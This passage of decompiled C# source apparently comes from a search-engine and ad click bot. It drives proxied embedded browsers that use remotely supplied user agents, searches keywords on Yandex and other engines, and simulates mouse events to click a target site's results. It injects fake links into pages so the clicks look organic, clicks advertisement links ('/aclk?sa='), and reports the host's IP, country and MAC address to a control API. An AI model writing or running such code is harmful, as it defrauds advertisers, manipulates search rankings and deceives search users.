									HtmlElementCollection elementsByTagName4 = ((WebBrowser)webBrowserWithProxy3).get_Document().GetElementsByTagName("a");
									string text6 = item3.Url.Replace("http://", "").Replace("https://", "");
									string text7 = text6.Split(new char[1] { '/' })[0].ToLower();
									IEnumerator enumerator9 = elementsByTagName4.GetEnumerator();
									try
									{
										while (enumerator9.MoveNext())
										{
											HtmlElement val8 = (HtmlElement)enumerator9.Current;
											if (!val8.get_Parent().get_OuterHtml().ToLower()
												.Contains(string.Concat(text7)))
											{
												if (val8.get_Parent().get_OuterHtml().ToLower()
													.Contains("class=\"next\""))
												{
													val7 = val8;
												}
												continue;
											}
											val8.Focus();
											val8.InvokeMember("onmousemove");
											val8.InvokeMember("onmousedown");
											val8.InvokeMember("onmouseup");
											val8.SetAttribute("target", "_self");
											Application.DoEvents();
											val8.InvokeMember("Click");
											WaitPage(10);
											for (int num = 0; num < item3.BrowserPages; num++)
											{
												Wait(this.random.Next(item3.DMIN_Browse, item3.DMAX_Browse));
												Application.DoEvents();
												int index4 = this.random.Next(0, Lsinnerurl.Count - 1);
												try
												{
													while ((int)((WebBrowser)webBrowserWithProxy3).get_ReadyState() != 4)
													{
														Application.DoEvents();
													}
													try
													{
														HtmlElement val9 = ((WebBrowser)webBrowserWithProxy3).get_Document().CreateElement("A");
														val9.SetAttribute("HREF", Lsinnerurl[index4]);
														val9.set_InnerText(lsKeyword3);
														val9.SetAttribute("rel", "follow");
														((WebBrowser)webBrowserWithProxy3).get_Document().get_Body().AppendChild(val9);
														val9.Focus();
														val9.InvokeMember("onmousemove");
														val9.InvokeMember("onmousedown");
														val9.InvokeMember("onmouseup");
														Application.DoEvents();
														val9.InvokeMember("Click");
														Wait(10);
														Lsinnerurl.RemoveAt(index4);
													}
													catch
													{
														continue;
													}
												}
												catch
												{
													continue;
												}
												break;
											}
											SetAction(item3);
											break;
										}
									}
									catch
									{
									}
									finally
									{
										IDisposable disposable6 = enumerator9 as IDisposable;
										if (disposable6 != null)
										{
											disposable6.Dispose();
										}
									}
									if (counter > 0)
									{
										counter = 0;
										continue;
									}
									if (val7 != (HtmlElement)null)
									{
										Application.DoEvents();
										if (currpage < item3.MaxSeoEnginPage)
										{
											currpage++;
											val7.InvokeMember("click");
											WaitPage(10);
											continue;
										}
										currpage = 1;
										break;
									}
									Wait(15);
									break;
								}
								while (!bStop);
								continue;
								end_IL_0e50:;
							}
							finally
							{
								((IDisposable)webBrowserWithProxy3)?.Dispose();
							}
							break;
						}
						break;
					}
					case 7:
					{
						string user_agent6 = loadUserAgent(item3.actionurl);
						object[] listYandex = ListYandex;
						for (int num5 = 0; num5 < listYandex.Length; num5++)
						{
							string text10 = (string)listYandex[num5];
							if (text10.ToLower().Contains(item3.Location.ToLower()))
							{
								EnginBrowser = text10;
								break;
							}
						}
						foreach (string lsKeyword4 in LsKeywords)
						{
							WebBrowserWithProxy webBrowserWithProxy9 = new WebBrowserWithProxy();
							try
							{
								((WebBrowser)webBrowserWithProxy9).set_ScriptErrorsSuppressed(true);
								((WebBrowser)webBrowserWithProxy9).set_ObjectForScripting((object)true);
								webBrowserWithProxy9.user_agent = user_agent6;
								currpage = 1;
								((WebBrowser)webBrowserWithProxy9).Navigate(EnginBrowser);
								WaitPage(10);
								Wait(this.random.Next(item3.DMIN_Search, item3.DMAX_Search));
								while ((int)((WebBrowser)webBrowserWithProxy9).get_ReadyState() != 4)
								{
									Application.DoEvents();
								}
								if ((int)((WebBrowser)webBrowserWithProxy9).get_ReadyState() == 4)
								{
									try
									{
										((Control)this).Focus();
										((WebBrowser)webBrowserWithProxy9).get_Document().GetElementById("text").SetAttribute("value", lsKeyword4);
										((WebBrowser)webBrowserWithProxy9).get_Document().GetElementById("text").Focus();
										Wait(3);
										((Control)webBrowserWithProxy9).Focus();
										Application.DoEvents();
										SendKeys.Send("{ENTER}");
									}
									catch
									{
										Application.DoEvents();
										goto end_IL_1375;
									}
									try
									{
										Thread.Sleep(100);
										HtmlElementCollection elementsByTagName8 = ((WebBrowser)webBrowserWithProxy9).get_Document().GetElementsByTagName("form");
										foreach (HtmlElement item4 in elementsByTagName8)
										{
											HtmlElement val17 = item4;
											if (val17.GetAttribute("role").Contains("search"))
											{
												val17.InvokeMember("submit");
												break;
											}
										}
										Application.DoEvents();
									}
									catch
									{
									}
								}
								do
								{
									Wait(this.random.Next(item3.DMIN_Match, item3.DMAX_Match));
									Application.DoEvents();
									HtmlElement val18 = null;
									while ((int)((WebBrowser)webBrowserWithProxy9).get_ReadyState() != 4)
									{
										Application.DoEvents();
									}
									HtmlElementCollection elementsByTagName9 = ((WebBrowser)webBrowserWithProxy9).get_Document().GetElementsByTagName("a");
									string text11 = item3.Url.Replace("http://", "").Replace("https://", "");
									string text12 = text11.Split(new char[1] { '/' })[0].ToLower();
									IEnumerator enumerator15 = elementsByTagName9.GetEnumerator();
									try
									{
										while (enumerator15.MoveNext())
										{
											try
											{
												HtmlElement val19 = (HtmlElement)enumerator15.Current;
												if (!val19.GetAttribute("href").ToLower().Contains(string.Concat(text12)))
												{
													if (val19.get_Parent().get_OuterText().Contains("дальше"))
													{
														val18 = val19;
													}
													continue;
												}
												val19.Focus();
												val19.InvokeMember("onmousemove");
												val19.InvokeMember("onmousedown");
												val19.InvokeMember("onmouseup");
												val19.SetAttribute("target", "_self");
												Application.DoEvents();
												val19.InvokeMember("Click");
												WaitPage(10);
												for (int num6 = 0; num6 < item3.BrowserPages; num6++)
												{
													Wait(this.random.Next(item3.DMIN_Browse, item3.DMAX_Browse));
													Application.DoEvents();
													int index6 = this.random.Next(0, Lsinnerurl.Count - 1);
													try
													{
														while ((int)((WebBrowser)webBrowserWithProxy9).get_ReadyState() != 4)
														{
															Application.DoEvents();
														}
														try
														{
															HtmlElement val20 = ((WebBrowser)webBrowserWithProxy9).get_Document().CreateElement("A");
															val20.SetAttribute("HREF", Lsinnerurl[index6]);
															val20.set_InnerText(lsKeyword4);
															val20.SetAttribute("rel", "follow");
															((WebBrowser)webBrowserWithProxy9).get_Document().get_Body().AppendChild(val20);
															val20.Focus();
															val20.InvokeMember("onmousemove");
															val20.InvokeMember("onmousedown");
															val20.InvokeMember("onmouseup");
															Application.DoEvents();
															val20.InvokeMember("Click");
															Wait(10);
															Lsinnerurl.RemoveAt(index6);
														}
														catch
														{
															continue;
														}
													}
													catch
													{
														continue;
													}
													break;
												}
												SetAction(item3);
												break;
											}
											catch
											{
											}
										}
									}
									catch
									{
									}
									finally
									{
										IDisposable disposable7 = enumerator15 as IDisposable;
										if (disposable7 != null)
										{
											disposable7.Dispose();
										}
									}
									if (counter > 0)
									{
										counter = 0;
										continue;
									}
									if (val18 != (HtmlElement)null)
									{
										Application.DoEvents();
										if (currpage < item3.MaxSeoEnginPage)
										{
											currpage++;
											val18.InvokeMember("click");
											WaitPage(10);
											continue;
										}
										currpage = 1;
										break;
									}
									Wait(15);
									break;
								}
								while (!bStop);
								continue;
								end_IL_1375:;
							}
							finally
							{
								((IDisposable)webBrowserWithProxy9)?.Dispose();
							}
							break;
						}
						break;
					}
					case 11:
						try
						{
							string user_agent5 = loadUserAgent(item3.actionurl);
							bool flag = false;
							WebBrowserWithProxy webBrowserWithProxy7 = new WebBrowserWithProxy();
							try
							{
								((WebBrowser)webBrowserWithProxy7).set_ScriptErrorsSuppressed(true);
								((WebBrowser)webBrowserWithProxy7).set_ObjectForScripting((object)true);
								webBrowserWithProxy7.user_agent = user_agent5;
								((WebBrowser)webBrowserWithProxy7).Navigate(item3.Url);
								WaitPage(10);
								Application.DoEvents();
								HtmlElementCollection elementsByTagName7 = ((WebBrowser)webBrowserWithProxy7).get_Document().GetElementsByTagName("a");
								foreach (HtmlElement item5 in elementsByTagName7)
								{
									HtmlElement val16 = item5;
									string text9 = Convert.ToString(val16.GetAttribute("href"));
									if (!text9.Contains("/aclk?sa=") && !text9.Contains(",Ads"))
									{
										continue;
									}
									try
									{
										WebBrowserWithProxy webBrowserWithProxy8 = new WebBrowserWithProxy();
										try
										{
											flag = true;
											((WebBrowser)webBrowserWithProxy8).set_ScriptErrorsSuppressed(true);
											((WebBrowser)webBrowserWithProxy8).set_ObjectForScripting((object)true);
											webBrowserWithProxy8.user_agent = user_agent5;
											webBrowserWithProxy8.Goto1(text9);
											Wait(this.random.Next(item3.DMIN_Search, item3.DMAX_Search));
											WaitPage(item3.DMIN_Browse);
										}
										finally
										{
											((IDisposable)webBrowserWithProxy8)?.Dispose();
										}
									}
									catch
									{
									}
								}
								if (!flag)
								{
									SetAction(item3);
								}
							}
							finally
							{
								((IDisposable)webBrowserWithProxy7)?.Dispose();
							}
						}
						catch
						{
						}
						break;
					case 12:
						try
						{
							Random random2 = new Random();
							int num4 = random2.Next(0, item3.InternalUrls.Split(new char[1] { '\n' }).Length - 1);
							loadUserAgent(item3.actionurl);
							WebBrowserWithProxy webBrowserWithProxy6 = new WebBrowserWithProxy();
							try
							{
								((WebBrowser)webBrowserWithProxy6).set_ScriptErrorsSuppressed(true);
								((WebBrowser)webBrowserWithProxy6).set_ObjectForScripting((object)true);
								webBrowserWithProxy6.Goto1(item3.InternalUrls.Split(new char[1] { '\n' })[num4]);
								WaitPage(10);
								Application.DoEvents();
								Wait(this.random.Next(item3.DMIN_Browse, item3.DMAX_Browse));
								Application.DoEvents();
								try
								{
									HtmlElement val14 = ((WebBrowser)webBrowserWithProxy6).get_Document().CreateElement("a");
									val14.SetAttribute("href", item3.Url);
									val14.set_InnerText(item3.Keywords);
									((WebBrowser)webBrowserWithProxy6).get_Document().get_Body().AppendChild(val14);
									val14.Focus();
									val14.InvokeMember("onmousemove");
									val14.InvokeMember("onmousedown");
									val14.InvokeMember("onmouseup");
									Application.DoEvents();
									val14.InvokeMember("Click");
								}
								catch (Exception ex)
								{
									MessageBox.Show(ex.Message);
								}
								WaitPage(10);
								HtmlElementCollection elementsByTagName6 = ((WebBrowser)webBrowserWithProxy6).get_Document().GetElementsByTagName("a");
								IEnumerator enumerator11 = elementsByTagName6.GetEnumerator();
								try
								{
									while (enumerator11.MoveNext())
									{
										try
										{
											HtmlElement val15 = (HtmlElement)enumerator11.Current;
											if (val15.GetAttribute("href").ToLower().Contains(string.Concat(item3.Keywords)))
											{
												val15.SetAttribute("target", "");
												val15.Focus();
												val15.InvokeMember("onmousemove");
												val15.InvokeMember("onmousedown");
												val15.InvokeMember("onmouseup");
												Application.DoEvents();
												val15.InvokeMember("Click");
												Wait(this.random.Next(item3.DMIN_Browse, item3.DMAX_Browse));
												SetAction(item3);
												Application.DoEvents();
												break;
											}
										}
										catch
										{
										}
									}
								}
								catch
								{
								}
							}
							finally
							{
								((IDisposable)webBrowserWithProxy6)?.Dispose();
							}
						}
						catch
						{
						}
						break;
					case 13:
						try
						{
							Random random = new Random();
							int num3 = random.Next(0, item3.InternalUrls.Split(new char[1] { '\n' }).Length - 1);
							loadUserAgent(item3.actionurl);
							WebBrowserWithProxy webBrowserWithProxy5 = new WebBrowserWithProxy();
							try
							{
								((WebBrowser)webBrowserWithProxy5).set_ScriptErrorsSuppressed(true);
								((WebBrowser)webBrowserWithProxy5).set_ObjectForScripting((object)true);
								webBrowserWithProxy5.Goto1(item3.InternalUrls.Split(new char[1] { '\n' })[num3]);
								WaitPage(10);
								Application.DoEvents();
								Wait(this.random.Next(item3.DMIN_Browse, item3.DMAX_Browse));
								Application.DoEvents();
								try
								{
									HtmlElement val11 = ((WebBrowser)webBrowserWithProxy5).get_Document().CreateElement("a");
									val11.SetAttribute("href", item3.Url);
									val11.set_InnerText(item3.Keywords);
									val11.SetAttribute("rel", "nofollow");
									((WebBrowser)webBrowserWithProxy5).get_Document().get_Body().AppendChild(val11);
									val11.Focus();
									val11.InvokeMember("onmousemove");
									val11.InvokeMember("onmousedown");
									val11.InvokeMember("onmouseup");
									Application.DoEvents();
									val11.InvokeMember("Click");
								}
								catch
								{
								}
								WaitPage(10);
								HtmlElementCollection elementsByTagName5 = ((WebBrowser)webBrowserWithProxy5).get_Document().GetElementsByTagName("a");
								IEnumerator enumerator10 = elementsByTagName5.GetEnumerator();
								string text8 = "";
								try
								{
									while (enumerator10.MoveNext())
									{
										try
										{
											HtmlElement val12 = (HtmlElement)enumerator10.Current;
											if (val12.GetAttribute("href").ToLower().Contains(string.Concat(item3.Keywords)))
											{
												text8 = val12.GetAttribute("href").ToLower();
												break;
											}
										}
										catch
										{
										}
									}
									if (!string.IsNullOrEmpty(text8))
									{
										webBrowserWithProxy5.Goto1(item3.Url);
										WaitPage(10);
										Application.DoEvents();
										Wait(this.random.Next(item3.DMIN_Browse, item3.DMAX_Browse));
										Application.DoEvents();
										try
										{
											HtmlElement val13 = ((WebBrowser)webBrowserWithProxy5).get_Document().CreateElement("a");
											val13.SetAttribute("href", text8);
											val13.set_InnerText(item3.Keywords);
											val13.SetAttribute("rel", "nofollow");
											((WebBrowser)webBrowserWithProxy5).get_Document().get_Body().AppendChild(val13);
											val13.Focus();
											val13.InvokeMember("onmousemove");
											val13.InvokeMember("onmousedown");
											val13.InvokeMember("onmouseup");
											Application.DoEvents();
											val13.InvokeMember("Click");
											SetAction(item3);
										}
										catch
										{
										}
										WaitPage(30);
									}
								}
								catch
								{
								}
							}
							finally
							{
								((IDisposable)webBrowserWithProxy5)?.Dispose();
							}
						}
						catch
						{
						}
						break;
					case 14:
					{
						int index = 0;
						List<string> list2 = new List<string>();
						string[] array3 = item3.Keywords.Split(new char[1] { '\n' });
						foreach (string item in array3)
						{
							list2.Add(item);
						}
						string user_agent = loadUserAgent(item3.actionurl);
						while (true)
						{
							try
							{
								try
								{
									WebBrowserWithProxy webBrowserWithProxy = new WebBrowserWithProxy();
									try
									{
										((WebBrowser)webBrowserWithProxy).set_ScriptErrorsSuppressed(true);
										((WebBrowser)webBrowserWithProxy).set_ObjectForScripting((object)true);
										webBrowserWithProxy.user_agent = user_agent;
										for (int l = 0; l < item3.BrowserPages; l++)
										{
											index = this.random.Next(0, list2.Count - 1);
											new Request().Execute(list2[index]);
											((WebBrowser)webBrowserWithProxy).Navigate(list2[index]);
											list2.RemoveAt(index);
											WaitPage(10);
											Application.DoEvents();
											Wait(this.random.Next(item3.DMIN_Browse, item3.DMAX_Browse));
											Application.DoEvents();
											try
											{
												int index2 = this.random.Next(0, Lsinnerurl.Count - 1);
												HtmlElement val = ((WebBrowser)webBrowserWithProxy).get_Document().CreateElement("a");
												val.SetAttribute("href", Lsinnerurl[index2].Split(new char[1] { ',' })[0]);
												try
												{
													val.set_InnerText(Lsinnerurl[index2].Split(new char[1] { ',' })[1]);
												}
												catch
												{
													val.set_InnerText(item3.Keywords.Replace(",", ""));
												}
												val.SetAttribute("rel", "follow");
												((WebBrowser)webBrowserWithProxy).get_Document().get_Body().AppendChild(val);
												val.Focus();
												val.InvokeMember("onmousemove");
												val.InvokeMember("onmousedown");
												val.InvokeMember("onmouseup");
												Application.DoEvents();
												val.InvokeMember("Click");
												Lsinnerurl.RemoveAt(index2);
											}
											catch
											{
											}
											WaitPage(40);
											SetAction(item3);
										}
									}
									finally
									{
										((IDisposable)webBrowserWithProxy)?.Dispose();
									}
								}
								catch
								{
									continue;
								}
							}
							catch
							{
								if (list2.Count < 1)
								{
									break;
								}
								list2.RemoveAt(index);
								continue;
							}
							break;
						}
						break;
					}
					}
				}
			}
			catch
			{
				Thread.Sleep(300000);
			}
		}
	}

	private void Wait(int sekundi)
	{
		int num = 0;
		do
		{
			Application.DoEvents();
			Thread.Sleep(100);
			num += 100;
		}
		while (num < sekundi * 1000 && !bStop);
	}

	private void WaitPage(int s)
	{
		UnblockTime = s;
		TimerWiting.Start();
		PageLoadFinished = 0;
		do
		{
			Application.DoEvents();
			Thread.Sleep(100);
		}
		while (PageLoadFinished == 0 && !bStop);
		PageLoadFinished = 0;
		TimerWiting.Stop();
	}

	private List<SeoPanExtInfo> GetList(string Urlsite)
	{
		try
		{
			string myIP = new geoLocation().GetMyIP();
			string text = "";
			text = $"{Urlsite}/DesktopModules/DnnSeoPlusdnn/API/PlusDnnseo/ADDIps?IPsInfo={myIP.Split(new char[1] { '\n' })[0].Trim(new char[1] { ' ' })}&Country={myIP.Split(new char[1] { '\n' })[1].Trim(new char[1] { ' ' })}&MacSystem={MACAddress}";
			Request request = new Request();
			string text2 = request.Execute(text).ToString();
			List<SeoPanExtInfo> list = JsonConvert.DeserializeObject<List<SeoPanExtInfo>>(text2);
			List<SeoPanExtInfo> list2 = new List<SeoPanExtInfo>();
			foreach (SeoPanExtInfo item in list)
			{
				SeoPanExtInfo seoPanExtInfo = new SeoPanExtInfo();
				seoPanExtInfo.Actions = item.Actions;
				seoPanExtInfo.actionurl = Urlsite;
				seoPanExtInfo.BrowserPages = item.BrowserPages;
				seoPanExtInfo.DMAX_Browse = item.DMAX_Browse;
				seoPanExtInfo.DMAX_Loop = item.DMAX_Loop;
				seoPanExtInfo.DMAX_Match = item.DMAX_Match;
				seoPanExtInfo.DMAX_Search = item.DMAX_Search;
				seoPanExtInfo.DMIN_Browse = item.DMIN_Browse;
				seoPanExtInfo.DMIN_Loop = item.DMIN_Loop;
				seoPanExtInfo.DMIN_Match = item.DMIN_Match;
				seoPanExtInfo.DMIN_Search = item.DMIN_Search;
				seoPanExtInfo.Id = item.Id;
				seoPanExtInfo.InternalUrls = item.InternalUrls;
				seoPanExtInfo.Keywords = item.Keywords;
				seoPanExtInfo.Location = item.Location;
				seoPanExtInfo.MaxSeoEnginPage = item.MaxSeoEnginPage;
				seoPanExtInfo.Titel = item.Titel;
				seoPanExtInfo.Url = item.Url;
				list2.Add(seoPanExtInfo);
			}
			return list2;
		}
		catch
		{
			return null;
		}
	}

	private void SetAction(SeoPanExtInfo seoPanExtInfo)
	{
		try
		{
			string myIP = new geoLocation().GetMyIP();
			string url = $"{seoPanExtInfo.actionurl}/DesktopModules/DnnSeoPlusdnn/API/PlusDnnseo/TotalClick?IPsInfo={myIP.Split(new char[1] { '\n' })[0].Trim(new char[1] { ' ' })}&Country={myIP.Split(new char[1] { '\n' })[1].Trim(new char[1] { ' ' })}&MacSystem={MACAddress}&Id={seoPanExtInfo.Id}";
			new Request().Execute(url);
		}
		catch
		{
		}
	}

	private string loadUserAgent(string Urlsite)
	{
		return new Request().Execute($"{Urlsite}/DesktopModules/DnnSeoPlusdnn/API/PlusDnnseo/UserAjent").ToString();
	}

	private string GetMACAddress()
	{
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		string text = string.Empty;
		NetworkInterface[] array = allNetworkInterfaces;
		foreach (NetworkInterface networkInterface in array)
		{
			if (text == string.Empty)
			{
				text = networkInterface.GetPhysicalAddress().ToString();
			}
		}
		return text;
	}

	private void TimerWiting_Tick(object sender, EventArgs e)
	{
		UnblockTime--;
		if (UnblockTime == 0)
		{
			PageLoadFinished = 1;
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		Start();
	}
}
